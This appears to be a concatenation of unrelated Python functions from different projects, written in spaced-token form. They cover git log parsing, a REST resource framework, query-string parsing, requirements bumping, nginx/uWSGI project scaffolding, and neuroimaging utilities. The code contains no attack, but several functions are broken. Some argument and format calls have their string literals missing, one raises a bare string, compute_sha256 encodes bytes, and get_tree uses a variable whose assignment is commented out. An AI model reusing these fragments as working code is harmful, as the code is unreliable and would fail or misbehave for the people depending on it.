def compute_sha256 ( filename ) : try : h = sha256 ( ) fd = open ( filename , 'rb' ) while True : buf = fd . read ( 0x1000000 ) if buf in [ None , "" ] : break h . update ( buf . encode ( 'utf-8' ) ) fd . close ( ) return h . hexdigest ( ) except : output = run ( [ "sha256sum" , "-b" , filename ] ) return output . split ( " " ) [ 0 ]
def run ( cmd ) : cmd = [ pipes . quote ( c ) for c in cmd ] cmd = " " . join ( cmd ) cmd += "; exit 0" # print("Running {} in {}".format(cmd, os.getcwd())) try : output = subprocess . check_output ( cmd , stderr = subprocess . STDOUT , shell = True ) except subprocess . CalledProcessError as e : output = e . output output = output . decode ( 'utf-8' ) output = output . strip ( ) return output
def get_tree ( gitdir = "." ) : cmd = [ "git" , "log" , "--all" , "--branches" , '--pretty=format:{  "commit": "%H",  "abbreviated_commit": "%h",  "tree": "%T",  "abbreviated_tree": "%t",  "parent": "%P",  "abbreviated_parent": "%p",  "refs": "%d",  "encoding": "%e",  "subject": "%s", "sanitized_subject_line": "%f",  "commit_notes": "",  "author": {    "name": "%aN",    "email": "%aE",    "date": "%ai"  },  "commiter": {    "name": "%cN",    "email": "%cE",    "date": "%ci"  }},' ] output = run ( cmd ) lines = output . split ( "\n" ) content = "" history = [ ] for l in lines : try : revisedcontent = content + l if revisedcontent . count ( '"' ) % 2 == 0 : j = json . loads ( revisedcontent [ : - 1 ] ) if "Notes added by" in j [ 'subject' ] : content = "" continue history . append ( j ) content = "" else : content = revisedcontent except Exception as e : print ( "Error while parsing record" ) print ( revisedcontent ) content = "" # Order by time. First commit first... history . reverse ( ) # changes = get_change ( ) for i in range ( len ( history ) ) : abbrev_commit = history [ i ] [ 'abbreviated_commit' ] if abbrev_commit not in changes : raise Exception ( "Missing changes for " + abbrev_commit ) history [ i ] [ 'changes' ] = changes [ abbrev_commit ] [ 'changes' ] return history
def get_diffs ( history ) : # First get all possible representations mgr = plugins_get_mgr ( ) keys = mgr . search ( 'representation' ) [ 'representation' ] representations = [ mgr . get_by_key ( 'representation' , k ) for k in keys ] for i in range ( len ( history ) ) : if i + 1 > len ( history ) - 1 : continue prev = history [ i ] curr = history [ i + 1 ] #print(prev['subject'], "==>", curr['subject']) #print(curr['changes']) for c in curr [ 'changes' ] : path = c [ 'path' ] # Skip the metadata file if c [ 'path' ] . endswith ( 'datapackage.json' ) : continue # Find a handler for this kind of file... handler = None for r in representations : if r . can_process ( path ) : handler = r break if handler is None : continue # print(path, "being handled by", handler) v1_hex = prev [ 'commit' ] v2_hex = curr [ 'commit' ] temp1 = tempfile . mkdtemp ( prefix = "dgit-diff-" ) try : for h in [ v1_hex , v2_hex ] : filename = '{}/{}/checkout.tar' . format ( temp1 , h ) try : os . makedirs ( os . path . dirname ( filename ) ) except : pass extractcmd = [ 'git' , 'archive' , '-o' , filename , h , path ] output = run ( extractcmd ) if 'fatal' in output : raise Exception ( "File not present in commit" ) with cd ( os . path . dirname ( filename ) ) : cmd = [ 'tar' , 'xvf' , 'checkout.tar' ] output = run ( cmd ) if 'fatal' in output : print ( "Cleaning up - fatal 1" , temp1 ) shutil . rmtree ( temp1 ) continue # Check to make sure that  path1 = os . path . join ( temp1 , v1_hex , path ) path2 = os . path . join ( temp1 , v2_hex , path ) if not os . path . exists ( path1 ) or not os . path . exists ( path2 ) : # print("One of the two output files is missing")  shutil . rmtree ( temp1 ) continue #print(path1, path2)  # Now call the handler diff = handler . get_diff ( path1 , path2 ) # print("Inserting diff", diff) c [ 'diff' ] = diff except Exception as e : #traceback.print_exc()  #print("Cleaning up - Exception ", temp1) shutil . rmtree ( temp1 )
def _set_path ( self , path ) : import os . path self . path = os . path . abspath ( path ) self . dirname = os . path . dirname ( path ) self . basename = os . path . basename ( path )
def images ( self ) : tifs = _pattern ( self . _image_path , extension = 'tif' ) pngs = _pattern ( self . _image_path , extension = 'png' ) imgs = [ ] imgs . extend ( glob ( tifs ) ) imgs . extend ( glob ( pngs ) ) return imgs
def scanning_template ( self ) : tmpl = glob ( _pattern ( self . path , _additional_data , _scanning_template , extension = '*.xml' ) ) if tmpl : return tmpl [ 0 ] else : return ''
def wait ( self ) : interval_seconds = 5 while True : actions = self . actions ( ) slept = False for a in actions : if a [ 'status' ] == 'in-progress' : # n.b. gevent will monkey patch time . sleep ( interval_seconds ) slept = True break if not slept : break
def format_parameters ( self , * * kwargs ) : req_data = { } for k , v in kwargs . items ( ) : if isinstance ( v , ( list , tuple ) ) : k = k + '[]' req_data [ k ] = v return req_data
def format_request_url ( self , resource , * args ) : return '/' . join ( ( self . api_url , self . api_version , resource ) + tuple ( str ( x ) for x in args ) )
def list ( self , url_components = ( ) ) : resp = self . get ( url_components ) return resp . get ( self . result_key , [ ] )
def get ( self , id , * * kwargs ) : return ( super ( MutableCollection , self ) . get ( ( id , ) , * * kwargs ) . get ( self . singular , None ) )
def get ( self , id , * * kwargs ) : return super ( DomainRecords , self ) . get ( id , * * kwargs )
def chop ( list_ , n ) : # could look into itertools also, might be implemented there size = len ( list_ ) each = size // n if each == 0 : return [ list_ ] chopped = [ ] for i in range ( n ) : start = i * each end = ( i + 1 ) * each if i == ( n - 1 ) : # make sure we get all items, let last worker do a litte more end = size chopped . append ( list_ [ start : end ] ) return chopped
def allowed_operations ( self ) : if self . slug is not None : return self . meta . detail_allowed_operations return self . meta . list_allowed_operations
def assert_operations ( self , * args ) : if not set ( args ) . issubset ( self . allowed_operations ) : raise http . exceptions . Forbidden ( )
def make_response ( self , data = None ) : if data is not None : # Prepare the data for transmission. data = self . prepare ( data ) # Encode the data using a desired encoder. self . response . write ( data , serialize = True )
def get ( self , request , response ) : # Ensure we're allowed to read the resource. self . assert_operations ( 'read' ) # Delegate to `read` to retrieve the items. items = self . read ( ) # if self.slug is not None and not items: #     # Requested a specific resource but nothing is returned. #     # Attempt to resolve by changing what we understand as #     # a slug to a path. #     self.path = self.path + self.slug if self.path else self.slug #     self.slug = None #     # Attempt to retreive the resource again. #     items = self.read() # Ensure that if we have a slug and still no items that a 404 # is rasied appropriately. if not items : raise http . exceptions . NotFound ( ) if ( isinstance ( items , Iterable ) and not isinstance ( items , six . string_types ) ) and items : # Paginate over the collection. items = pagination . paginate ( self . request , self . response , items ) # Build the response object. self . make_response ( items )
def post ( self , request , response ) : if self . slug is not None : # Don't know what to do an item access. raise http . exceptions . NotImplemented ( ) # Ensure we're allowed to create a resource. self . assert_operations ( 'create' ) # Deserialize and clean the incoming object. data = self . _clean ( None , self . request . read ( deserialize = True ) ) # Delegate to `create` to create the item. item = self . create ( data ) # Build the response object. self . response . status = http . client . CREATED self . make_response ( item )
def put ( self , request , response ) : if self . slug is None : # Mass-PUT is not implemented. raise http . exceptions . NotImplemented ( ) # Check if the resource exists. target = self . read ( ) # Deserialize and clean the incoming object. data = self . _clean ( target , self . request . read ( deserialize = True ) ) if target is not None : # Ensure we're allowed to update the resource. self . assert_operations ( 'update' ) try : # Delegate to `update` to create the item. self . update ( target , data ) except AttributeError : # No read method defined. raise http . exceptions . NotImplemented ( ) # Build the response object. self . make_response ( target ) else : # Ensure we're allowed to create the resource. self . assert_operations ( 'create' ) # Delegate to `create` to create the item. target = self . create ( data ) # Build the response object. self . response . status = http . client . CREATED self . make_response ( target )
def delete ( self , request , response ) : if self . slug is None : # Mass-DELETE is not implemented. raise http . exceptions . NotImplemented ( ) # Ensure we're allowed to destroy a resource. self . assert_operations ( 'destroy' ) # Delegate to `destroy` to destroy the item. self . destroy ( ) # Build the response object. self . response . status = http . client . NO_CONTENT self . make_response ( )
def create_project ( self ) : if os . path . exists ( self . _py ) : prj_dir = os . path . join ( self . _app_dir , self . _project_name ) if os . path . exists ( prj_dir ) : if self . _force : logging . warn ( 'Removing existing project' ) shutil . rmtree ( prj_dir ) else : logging . warn ( 'Found existing project; not creating (use --force to overwrite)' ) return logging . info ( 'Creating project' ) p = subprocess . Popen ( 'cd {0} ; {1} startproject {2} > /dev/null' . format ( self . _app_dir , self . _ve_dir + os . sep + self . _project_name + os . sep + 'bin' + os . sep + 'django-admin.py' , self . _project_name ) , shell = True ) os . waitpid ( p . pid , 0 ) else : logging . error ( 'Unable to find Python interpreter in virtualenv' ) return
def parse ( text , encoding = 'utf8' ) : # Decode the text if we got bytes. if isinstance ( text , six . binary_type ) : text = text . decode ( encoding ) return Query ( text , split_segments ( text ) )
def split_segments ( text , closing_paren = False ) : buf = StringIO ( ) # The segments we're building, and the combinators used to combine them. # Note that after this is complete, this should be true: # len(segments) == len(combinators) + 1 # Thus we can understand the relationship between segments and combinators # like so: #  s1 (c1) s2 (c2) s3 (c3) where sN are segments and cN are combination # functions. # TODO: Figure out exactly where the querystring died and post cool # error messages about it. segments = [ ] combinators = [ ] # A flag dictating if the last character we processed was a group. # This is used to determine if the next character (being a combinator) # is allowed to last_group = False # The recursive nature of this function relies on keeping track of the # state of iteration.  This iterator will be passed down to recursed calls. iterator = iter ( text ) # Detection for exclamation points.  only matters for this situation: # foo=bar&!(bar=baz) last_negation = False for character in iterator : if character in COMBINATORS : if last_negation : buf . write ( constants . OPERATOR_NEGATION ) # The string representation of our segment. val = buf . getvalue ( ) reset_stringio ( buf ) if not last_group and not len ( val ) : raise ValueError ( 'Unexpected %s.' % character ) # When a group happens, the previous value is empty. if len ( val ) : segments . append ( parse_segment ( val ) ) combinators . append ( COMBINATORS [ character ] ) elif character == constants . GROUP_BEGIN : # Recursively go into the next group. if buf . tell ( ) : raise ValueError ( 'Unexpected %s' % character ) seg = split_segments ( iterator , True ) if last_negation : seg = UnarySegmentCombinator ( seg ) segments . append ( seg ) # Flag that the last entry was a grouping, so that we don't panic # when the next character is a logical combinator last_group = True continue elif character == constants . GROUP_END : # Build the segment for anything remaining, and then combine # all the segments. val = buf . getvalue ( ) # Check for unbalanced parens or an empty thing: foo=bar&();bar=baz if not buf . tell ( ) or not closing_paren : raise ValueError ( 'Unexpected %s' % character ) segments . append ( parse_segment ( val ) ) return combine ( segments , combinators ) elif character == constants . OPERATOR_NEGATION and not buf . tell ( ) : last_negation = True continue else : if last_negation : buf . write ( constants . OPERATOR_NEGATION ) if last_group : raise ValueError ( 'Unexpected %s' % character ) buf . write ( character ) last_negation = False last_group = False else : # Check and see if the iterator exited early (unbalanced parens) if closing_paren : raise ValueError ( 'Expected %s.' % constants . GROUP_END ) if not last_group : # Add the final segment. segments . append ( parse_segment ( buf . getvalue ( ) ) ) # Everything completed normally, combine all the segments into one # and return them. return combine ( segments , combinators )
def parse_segment ( text ) : if not len ( text ) : return NoopQuerySegment ( ) q = QuerySegment ( ) # First we need to split the segment into key/value pairs.  This is done # by attempting to split the sequence for each equality comparison.  Then # discard any that did not split properly.  Then chose the smallest key # (greedily chose the first comparator we encounter in the string) # followed by the smallest value (greedily chose the largest comparator # possible.) # translate into [('=', 'foo=bar')] equalities = zip ( constants . OPERATOR_EQUALITIES , itertools . repeat ( text ) ) # Translate into [('=', ['foo', 'bar'])] equalities = map ( lambda x : ( x [ 0 ] , x [ 1 ] . split ( x [ 0 ] , 1 ) ) , equalities ) # Remove unsplit entries and translate into [('=': ['foo', 'bar'])] # Note that the result from this stage is iterated over twice. equalities = list ( filter ( lambda x : len ( x [ 1 ] ) > 1 , equalities ) ) # Get the smallest key and use the length of that to remove other items key_len = len ( min ( ( x [ 1 ] [ 0 ] for x in equalities ) , key = len ) ) equalities = filter ( lambda x : len ( x [ 1 ] [ 0 ] ) == key_len , equalities ) # Get the smallest value length. thus we have the earliest key and the # smallest value. op , ( key , value ) = min ( equalities , key = lambda x : len ( x [ 1 ] [ 1 ] ) ) key , directive = parse_directive ( key ) if directive : op = constants . OPERATOR_EQUALITY_FALLBACK q . directive = directive # Process negation.  This comes in both foo.not= and foo!= forms. path = key . split ( constants . SEP_PATH ) last = path [ - 1 ] # Check for != if last . endswith ( constants . OPERATOR_NEGATION ) : last = last [ : - 1 ] q . negated = not q . negated # Check for foo.not= if last == constants . PATH_NEGATION : path . pop ( - 1 ) q . negated = not q . negated q . values = value . split ( constants . SEP_VALUE ) # Check for suffixed operators (foo.gte=bar).  Prioritize suffixed # entries over actual equality checks. if path [ - 1 ] in constants . OPERATOR_SUFFIXES : # The case where foo.gte<=bar, which obviously makes no sense. if op not in constants . OPERATOR_FALLBACK : raise ValueError ( 'Both path-style operator and equality style operator ' 'provided.  Please provide only a single style operator.' ) q . operator = constants . OPERATOR_SUFFIX_MAP [ path [ - 1 ] ] path . pop ( - 1 ) else : q . operator = constants . OPERATOR_EQUALITY_MAP [ op ] if not len ( path ) : raise ValueError ( 'No attribute navigation path provided.' ) q . path = path return q
def set ( self , target , value ) : if not self . _set : return if self . path is None : # There is no path defined on this resource. # We can do no magic to set the value. self . set = lambda * a : None return None if self . _segments [ target . __class__ ] : # Attempt to resolve access to this attribute. self . get ( target ) if self . _segments [ target . __class__ ] : # Attribute is not fully resolved; an interim segment is null. return # Resolve access to the parent object. # For a single-segment path this will effectively be a no-op. parent_getter = compose ( * self . _getters [ target . __class__ ] [ : - 1 ] ) target = parent_getter ( target ) # Make the setter. func = self . _make_setter ( self . path . split ( '.' ) [ - 1 ] , target . __class__ ) # Apply the setter now. func ( target , value ) # Replace this function with the constructed setter. def setter ( target , value ) : func ( parent_getter ( target ) , value ) self . set = setter
def indexesOptional ( f ) : stack = inspect . stack ( ) _NO_INDEX_CHECK_NEEDED . add ( '%s.%s.%s' % ( f . __module__ , stack [ 1 ] [ 3 ] , f . __name__ ) ) del stack return f
def get_method ( self , * args , * * kwargs ) : for method in self . gen_methods ( * args , * * kwargs ) : return method msg = 'No method was found for %r on %r.' raise self . DispatchError ( msg % ( ( args , kwargs ) , self . inst ) )
def gen_methods ( self , * args , * * kwargs ) : token = args [ 0 ] inst = self . inst prefix = self . _method_prefix for method_key in self . gen_method_keys ( * args , * * kwargs ) : method = getattr ( inst , prefix + method_key , None ) if method is not None : yield method # Fall back to built-in types, then types, then collections. typename = type ( token ) . __name__ yield from self . check_basetype ( token , typename , self . builtins . get ( typename ) ) for basetype_name in self . interp_types : yield from self . check_basetype ( token , basetype_name , getattr ( self . types , basetype_name , None ) ) for basetype_name in self . abc_types : yield from self . check_basetype ( token , basetype_name , getattr ( self . collections , basetype_name , None ) ) # Try the generic handler. yield from self . gen_generic ( )
def require ( self , req ) : reqs = req if isinstance ( req , list ) else [ req ] for req in reqs : if not isinstance ( req , BumpRequirement ) : req = BumpRequirement ( req ) req . required = True req . required_by = self self . requirements . append ( req )
def reverse ( self ) : if self . _original_target_content : with open ( self . target , 'w' ) as fp : fp . write ( self . _original_target_content )
def cons ( collection , value ) : if isinstance ( value , collections . Mapping ) : if collection is None : collection = { } collection . update ( * * value ) elif isinstance ( value , six . string_types ) : if collection is None : collection = [ ] collection . append ( value ) elif isinstance ( value , collections . Iterable ) : if collection is None : collection = [ ] collection . extend ( value ) else : if collection is None : collection = [ ] collection . append ( value ) return collection
def _merge ( options , name , bases , default = None ) : result = None for base in bases : if base is None : continue value = getattr ( base , name , None ) if value is None : continue result = utils . cons ( result , value ) value = options . get ( name ) if value is not None : result = utils . cons ( result , value ) return result or default
def package_info ( cls , package ) : if package not in cls . package_info_cache : package_json_url = 'https://pypi.python.org/pypi/%s/json' % package try : logging . getLogger ( 'requests' ) . setLevel ( logging . WARN ) response = requests . get ( package_json_url ) response . raise_for_status ( ) cls . package_info_cache [ package ] = simplejson . loads ( response . text ) except Exception as e : log . debug ( 'Could not get package info from %s: %s' , package_json_url , e ) cls . package_info_cache [ package ] = None return cls . package_info_cache [ package ]
def all_package_versions ( package ) : info = PyPI . package_info ( package ) return info and sorted ( info [ 'releases' ] . keys ( ) , key = lambda x : x . split ( ) , reverse = True ) or [ ]
def insert ( self , name , index , value ) : return self . _sequence [ name ] . insert ( index , value )
def send ( self , * args , * * kwargs ) : self . write ( * args , * * kwargs ) self . flush ( )
def insert ( self , name , index , value ) : return self . headers . insert ( index , value )
def create_project ( self ) : if os . path . exists ( self . _py ) : prj_dir = os . path . join ( self . _app_dir , self . _project_name ) if os . path . exists ( prj_dir ) : if self . _force : logging . warn ( 'Removing existing project' ) shutil . rmtree ( prj_dir ) else : logging . warn ( 'Found existing project; not creating (use --force to overwrite)' ) return logging . info ( 'Creating project' ) os . makedirs ( prj_dir ) # create the flask project stub app = """#!/usr/bin/env python\n""" """from flask import Flask\n""" """app = Flask(__name__)\n\n""" """@app.route(\"/\")\n""" """def hello():\n""" """    return \"Hello from Flask...\"\n\n""" """if __name__==\"__main__\":\n""" """    app.run()\n\n""" with open ( os . path . join ( prj_dir , 'app.py' ) , 'w' ) as f : f . write ( app ) else : logging . error ( 'Unable to find Python interpreter in virtualenv' ) return
def urls ( cls ) : return urls . patterns ( '' , urls . url ( r'^{}(?:$|(?P<path>[/:(.].*))' . format ( cls . meta . name ) , cls . view , name = 'armet-api-{}' . format ( cls . meta . name ) , kwargs = { 'resource' : cls . meta . name } ) )
def bump ( ) : parser = argparse . ArgumentParser ( description = bump . __doc__ ) parser . add_argument ( 'names' , nargs = '*' , help = ) parser . add_argument ( '--add' , '--require' , action = 'store_true' , help = 'Add the `names` to the requirements file if they don\'t exist.' ) parser . add_argument ( '--file' , help = 'Requirement file to bump. Defaults to requirements.txt and pinned.txt' ) parser . add_argument ( '--force' , action = 'store_true' , help = 'Force a bump even when certain bump requirements are not met.' ) parser . add_argument ( '-d' , '--detail' , '--dependencies' , action = 'store_true' , help = 'If available, show detailed changes. ' 'For pinned.txt, pin parsed dependency requirements from changes' ) parser . add_argument ( '-n' , '--dry-run' , action = 'store_true' , help = 'Perform a dry run without making changes' ) parser . add_argument ( '--debug' , action = 'store_true' , help = 'Turn on debug mode' ) args = parser . parse_args ( ) targets = [ args . file ] if args . file else [ 'requirements.txt' , 'pinned.txt' ] level = logging . DEBUG if args . debug else logging . INFO logging . basicConfig ( level = level , format = '[%(levelname)s] %(message)s' ) try : bumper = BumperDriver ( targets , full_throttle = args . force , detail = args . detail , test_drive = args . dry_run ) bumper . bump ( args . names , required = args . add , show_detail = args . detail ) except Exception as e : if args . debug : raise else : log . error ( e ) sys . exit ( 1 )
def _expand_targets ( self , targets , base_dir = None ) : all_targets = [ ] for target in targets : target_dirs = [ p for p in [ base_dir , os . path . dirname ( target ) ] if p ] target_dir = target_dirs and os . path . join ( * target_dirs ) or '' target = os . path . basename ( target ) target_path = os . path . join ( target_dir , target ) if os . path . exists ( target_path ) : all_targets . append ( target_path ) with open ( target_path ) as fp : for line in fp : if line . startswith ( '-r ' ) : _ , new_target = line . split ( ' ' , 1 ) all_targets . extend ( self . _expand_targets ( [ new_target . strip ( ) ] , base_dir = target_dir ) ) return all_targets
def get_nginx_config ( self ) : if os . path . exists ( self . _nginx_config ) : return open ( self . _nginx_config , 'r' ) . read ( ) else : return None
def check_directories ( self ) : self . log . debug ( 'Checking directories' ) if not os . path . exists ( self . _ve_dir ) : os . makedirs ( self . _ve_dir ) if not os . path . exists ( self . _app_dir ) : os . makedirs ( self . _app_dir ) if not os . path . exists ( self . _conf_dir ) : os . makedirs ( self . _conf_dir ) if not os . path . exists ( self . _var_dir ) : os . makedirs ( self . _var_dir ) if not os . path . exists ( self . _log_dir ) : os . makedirs ( self . _log_dir ) if not os . path . exists ( self . _script_dir ) : os . makedirs ( self . _script_dir ) # copy uswgi_params for nginx uwsgi_params = '/etc/nginx/uwsgi_params' if os . path . exists ( uwsgi_params ) : shutil . copy ( uwsgi_params , self . _conf_dir ) else : logging . warning ( 'Unable to find Nginx uwsgi_params.  You must manually copy this to {0}.' . format ( self . _conf_dir ) ) # copy mime.types for nginx mime_types = '/etc/nginx/mime.types' if os . path . exists ( mime_types ) : shutil . copy ( mime_types , self . _conf_dir ) self . _include_mimetypes = True else : logging . warn ( 'Unable to find mime.types for Nginx.  You must manually copy this to {0}.' . format ( self . _conf_dir ) )
def create_virtualenv ( self ) : if check_command ( 'virtualenv' ) : ve_dir = os . path . join ( self . _ve_dir , self . _project_name ) if os . path . exists ( ve_dir ) : if self . _force : logging . warn ( 'Removing existing virtualenv' ) shutil . rmtree ( ve_dir ) else : logging . warn ( 'Found existing virtualenv; not creating (use --force to overwrite)' ) return logging . info ( 'Creating virtualenv' ) p = subprocess . Popen ( 'virtualenv --no-site-packages {0} > /dev/null' . format ( ve_dir ) , shell = True ) os . waitpid ( p . pid , 0 ) # install modules for m in self . _modules : self . log . info ( 'Installing module {0}' . format ( m ) ) p = subprocess . Popen ( '{0} install {1} > /dev/null' . format ( os . path . join ( self . _ve_dir , self . _project_name ) + os . sep + 'bin' + os . sep + 'pip' , m ) , shell = True ) os . waitpid ( p . pid , 0 )
def create_nginx_config ( self ) : cfg = '# nginx config for {0}\n' . format ( self . _project_name ) if not self . _shared_hosting : # user if self . _user : cfg += 'user {0};\n' . format ( self . _user ) # misc nginx config cfg += . format ( os . path . join ( self . _log_dir , self . _project_name ) , os . path . join ( self . _var_dir , self . _project_name ) ) cfg += 'events {\n\tworker_connections 32;\n}\n\n' # http section cfg += 'http {\n' if self . _include_mimetypes : cfg += '\tinclude mime.types;\n' cfg += '\tdefault_type application/octet-stream;\n' cfg += '\tclient_max_body_size 1G;\n' cfg += '\tproxy_max_temp_file_size 0;\n' cfg += '\tproxy_buffering off;\n' cfg += '\taccess_log {0}-access.log;\n' . format ( os . path . join ( self . _log_dir , self . _project_name ) ) cfg += '\tsendfile on;\n' cfg += '\tkeepalive_timeout 65;\n' # server section cfg += '\tserver {\n' cfg += '\t\tlisten 0.0.0.0:{0};\n' . format ( self . _port ) if self . _server_name : cfg += '\t\tserver_name {0};\n' . format ( self . _server_name ) # location section cfg += '\t\tlocation / {\n' cfg += '\t\t\tuwsgi_pass unix:///{0}.sock;\n' . format ( os . path . join ( self . _var_dir , self . _project_name ) ) cfg += '\t\t\tinclude uwsgi_params;\n' cfg += '\t\t}\n\n' # end location # error page templates cfg += '\t\terror_page 500 502 503 504 /50x.html;\n' cfg += '\t\tlocation = /50x.html {\n' cfg += '\t\t\troot html;\n' # end error page section cfg += '\t\t}\n' # end server section cfg += '\t}\n' if not self . _shared_hosting : # end http section cfg += '}\n' # create conf f = open ( self . _nginx_config , 'w' ) f . write ( cfg ) f . close ( )
def create_manage_scripts ( self ) : # create start script start = '# start script for {0}\n\n' . format ( self . _project_name ) # start uwsgi start += 'echo \'Starting uWSGI...\'\n' start += 'sh {0}.uwsgi\n' . format ( os . path . join ( self . _conf_dir , self . _project_name ) ) start += 'sleep 1\n' # start nginx start += 'echo \'Starting Nginx...\'\n' start += 'nginx -c {0}_nginx.conf\n' . format ( os . path . join ( self . _conf_dir , self . _project_name ) ) start += 'sleep 1\n' start += 'echo \'{0} started\'\n\n' . format ( self . _project_name ) # stop script stop = '# stop script for {0}\n\n' . format ( self . _project_name ) # stop nginx stop += 'if [ -e {0}_nginx.pid ]; then nginx -c {1}_nginx.conf -s stop ; fi\n' . format ( os . path . join ( self . _var_dir , self . _project_name ) , os . path . join ( self . _conf_dir , self . _project_name ) ) # stop uwsgi stop += 'if [ -e {0}_uwsgi.pid ]; then kill -9 `cat {0}_uwsgi.pid` ; rm {0}_uwsgi.pid 2>&1 > /dev/null ; fi\n' . format ( os . path . join ( self . _var_dir , self . _project_name ) ) stop += 'echo \'{0} stopped\'\n' . format ( self . _project_name ) # write scripts start_file = '{0}_start.sh' . format ( os . path . join ( self . _script_dir , self . _project_name ) ) stop_file = '{0}_stop.sh' . format ( os . path . join ( self . _script_dir , self . _project_name ) ) f = open ( start_file , 'w' ) f . write ( start ) f . close ( ) f = open ( stop_file , 'w' ) f . write ( stop ) f . close ( ) # make executable os . chmod ( start_file , 0754 ) os . chmod ( stop_file , 0754 )
def create ( self ) : # create virtualenv self . create_virtualenv ( ) # create project self . create_project ( ) # generate uwsgi script self . create_uwsgi_script ( ) # generate nginx config self . create_nginx_config ( ) # generate management scripts self . create_manage_scripts ( ) logging . info ( '** Make sure to set proper permissions for the webserver user account on the var and log directories in the project root' )
def dasherize ( value ) : value = value . strip ( ) value = re . sub ( r'([A-Z])' , r'-\1' , value ) value = re . sub ( r'[-_\s]+' , r'-' , value ) value = re . sub ( r'^-' , r'' , value ) value = value . lower ( ) return value
def redirect ( cls , request , response ) : if cls . meta . legacy_redirect : if request . method in ( 'GET' , 'HEAD' , ) : # A SAFE request is allowed to redirect using a 301 response . status = http . client . MOVED_PERMANENTLY else : # All other requests must use a 307 response . status = http . client . TEMPORARY_REDIRECT else : # Modern redirects are allowed. Let's have some fun. # Hopefully you're client supports this. # The RFC explicitly discourages UserAgent sniffing. response . status = http . client . PERMANENT_REDIRECT # Terminate the connection. response . close ( )
def require_authentication ( self , request ) : request . user = user = None if request . method == 'OPTIONS' : # Authentication should not be checked on an OPTIONS request. return for auth in self . meta . authentication : user = auth . authenticate ( request ) if user is False : # Authentication protocol failed to authenticate; # pass the baton. continue if user is None and not auth . allow_anonymous : # Authentication protocol determined the user is # unauthenticated. auth . unauthenticated ( ) # Authentication protocol determined the user is indeed # authenticated (or not); Store the user for later reference. request . user = user return if not user and not auth . allow_anonymous : # No authenticated user found and protocol doesn't allow # anonymous users. auth . unauthenticated ( )
def require_accessibility ( self , user , method ) : if method == 'OPTIONS' : # Authorization should not be checked on an OPTIONS request. return authz = self . meta . authorization if not authz . is_accessible ( user , method , self ) : # User is not authorized; raise an appropriate message. authz . unaccessible ( )
def require_http_allowed_method ( cls , request ) : allowed = cls . meta . http_allowed_methods if request . method not in allowed : # The specified method is not allowed for the resource # identified by the request URI. # RFC 2616  10.4.6  405 Method Not Allowed raise http . exceptions . MethodNotAllowed ( allowed )
def resource ( * * kwargs ) : def inner ( function ) : name = kwargs . pop ( 'name' , None ) if name is None : name = utils . dasherize ( function . __name__ ) methods = kwargs . pop ( 'methods' , None ) if isinstance ( methods , six . string_types ) : # Tuple-ify the method if we got just a string. methods = methods , # Construct a handler. handler = ( function , methods ) if name not in _resources : # Initiate the handlers list. _handlers [ name ] = [ ] # Construct a light-weight resource using the passed kwargs # as the arguments for the meta. from armet import resources kwargs [ 'name' ] = name class LightweightResource ( resources . Resource ) : Meta = type ( str ( 'Meta' ) , ( ) , kwargs ) def route ( self , request , response ) : for handler , methods in _handlers [ name ] : if methods is None or request . method in methods : return handler ( request , response ) resources . Resource . route ( self ) # Construct and add this resource. _resources [ name ] = LightweightResource # Add this to the handlers. _handlers [ name ] . append ( handler ) # Return the resource. return _resources [ name ] # Return the inner method. return inner
def render_to_string ( self ) : values = '' for key , value in self . items ( ) : values += '{}={};' . format ( key , value ) return values
def from_cookie_string ( self , cookie_string ) : for key_value in cookie_string . split ( ';' ) : if '=' in key_value : key , value = key_value . split ( '=' , 1 ) else : key = key_value strip_key = key . strip ( ) if strip_key and strip_key . lower ( ) not in COOKIE_ATTRIBUTE_NAMES : self [ strip_key ] = value . strip ( )
def error_handler ( func ) : @ wraps ( func ) def wrapper ( * args , * * kwargs ) : try : return func ( * args , * * kwargs ) except BaseException as err : # Do not catch exceptions on testing if BOOTSTRAPPER_TEST_KEY in os . environ : raise # Fail silently if error handling disabled if ERROR_HANDLER_DISABLED : return True # Otherwise save traceback to log return save_traceback ( err ) return wrapper
def iteritems ( data , * * kwargs ) : return iter ( data . items ( * * kwargs ) ) if IS_PY3 else data . iteritems ( * * kwargs )
def iterkeys ( data , * * kwargs ) : return iter ( data . keys ( * * kwargs ) ) if IS_PY3 else data . iterkeys ( * * kwargs )
def remove_nodes ( self , pattern , adict ) : mydict = self . _filetree if adict is None else adict if isinstance ( mydict , dict ) : for nom in mydict . keys ( ) : if isinstance ( mydict [ nom ] , dict ) : matchs = filter_list ( mydict [ nom ] , pattern ) for nom in matchs : mydict = self . remove_nodes ( pattern , mydict [ nom ] ) mydict . pop ( nom ) else : mydict [ nom ] = filter_list ( mydict [ nom ] , pattern ) else : matchs = set ( filter_list ( mydict , pattern ) ) mydict = set ( mydict ) - matchs return mydict
def _num_samples ( x ) : if not hasattr ( x , '__len__' ) and not hasattr ( x , 'shape' ) : if hasattr ( x , '__array__' ) : x = np . asarray ( x ) else : raise TypeError ( "Expected sequence or array-like, got %r" % x ) return x . shape [ 0 ] if hasattr ( x , 'shape' ) else len ( x )
def voxspace_to_mmspace ( img ) : shape , affine = img . shape [ : 3 ] , img . affine coords = np . array ( np . meshgrid ( * ( range ( i ) for i in shape ) , indexing = 'ij' ) ) coords = np . rollaxis ( coords , 0 , len ( shape ) + 1 ) mm_coords = nib . affines . apply_affine ( affine , coords ) return mm_coords
def _load_images_and_labels ( self , images , labels = None ) : if not isinstance ( images , ( list , tuple ) ) : raise ValueError ( 'Expected an iterable (list or tuple) of strings or img-like objects. ' 'Got a {}.' . format ( type ( images ) ) ) if not len ( images ) > 0 : raise ValueError ( 'Expected an iterable (list or tuple) of strings or img-like objects ' 'of size higher than 0. Got {} items.' . format ( len ( images ) ) ) if labels is not None and len ( labels ) != len ( images ) : raise ValueError ( 'Expected the same length for image set ({}) and ' 'labels list ({}).' . format ( len ( images ) , len ( labels ) ) ) first_file = images [ 0 ] if first_file : first_img = NeuroImage ( first_file ) else : raise ( 'Error reading image {}.' . format ( repr_imgs ( first_file ) ) ) for idx , image in enumerate ( images ) : try : img = NeuroImage ( image ) self . check_compatibility ( img , first_img ) except : log . exception ( 'Error reading image {}.' . format ( repr_imgs ( image ) ) ) raise else : self . items . append ( img ) self . set_labels ( labels )
def die ( msg , code = - 1 ) : sys . stderr . write ( msg + "\n" ) sys . exit ( code )
def clean ( ctx ) : ctx . run ( f'python setup.py clean' ) dist = ROOT . joinpath ( 'dist' ) print ( f'removing {dist}' ) shutil . rmtree ( str ( dist ) )
